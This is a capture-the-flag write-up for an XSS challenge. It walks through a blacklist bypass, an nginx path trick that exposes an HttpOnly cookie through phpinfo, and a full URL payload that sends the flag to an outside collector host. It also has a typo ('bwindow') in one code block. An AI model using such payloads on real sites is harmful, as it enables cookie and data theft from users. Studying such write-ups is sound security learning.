### Hello
Reference: https://vaktibabat.github.io/posts/idek_2024/

This was an interestung xss challenge. When I visited the page, nothing displays on the page
According to index.php, there is a blacklist for what the name query can have

index.php
```
<?php
function Enhanced_Trim($inp) {
  $trimmed = array("\r", "\n", "\t", "/", " ");
  return str_replace($trimmed, "", $inp);
}

if(isset($_GET['name']))
{
  $name=substr($_GET['name'],0,23);
  echo "Hello, ".Enhanced_Trim($_GET['name']);
}
?>
```

Bypass for this blacklist: ```<svg%0conload=alert(123)>```
On entering this, we get a successful alert

Now since the flag is located in the flag cookie, we need to find a way to exfiltrate the cooie. However since forward slashes are blacklisted, to specify the url we can use:
```window.location.href.substring(0, 7)``` to substitute for https:// and ```window.location.href.substring(5, 6)``` for just /

However , the cookies have been set with HttpOnly attribute. A cookie with the HttpOnly attribute can’t be modified by JavaScript, for example using document.cookie; it can only be modified when it reaches the server. 

This is where the info.php page comes handy. An nginx bypass lets /info.php/index.php return the same info as info /info.php. Hence we can visit this page instead to get our cookies

The payload javascript:
```
fetch(window.location.href.substring(0, 7) + "idek-hello.chal.idek.team:1337" + bwindow.location.href.substring(5,6) + "info.php" + window.location.href.substring(5,6) + "index.php").then(function(response) {
	response.text().then(function(txt) {
	txt.split(`\n`).forEach(function(line) {
		if(line.indexOf("FLAG")!=-1) {
		fetch(window.location.href.substring(0, 7) + "mymockserver123456.free.beeceptor.com" + window.location.href.substring(5,6) + "cookies?resp=" + line)}
	})
	})
})
```
- The fetch() call returns us a promise with the Response of the /info.php/index.php page.
- text() function returns a promise with the text of the page as a string
- For each line, we want to send it to the attacker if it contains the flag by calling forEach on the lines:
- Then we check whether the string FLAG appears in the current line. If it does, it calls fetch with attacker.com/cookies?resp=

Final payload to be sent to the bot:
```http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=fetch(window.location.href.substring(0, 7)%2b"idek-hello.chal.idek.team:1337"%2bwindow.location.href.substring(5,6)%2b"info.php"%2bwindow.location.href.substring(5,6)%2b"index.php").then(function(response){response.text().then(function(txt){txt.split(`\n`).forEach(function(line){if(line.indexOf("FLAG")!=-1){fetch(window.location.href.substring(0, 7)%2b"mymockserver123456.free.beeceptor.com"%2bwindow.location.href.substring(5,6)%2b"cookies?resp="%2bline)}})})})>```

FLAG: idek{Ghazy_N3gm_Elbalad}
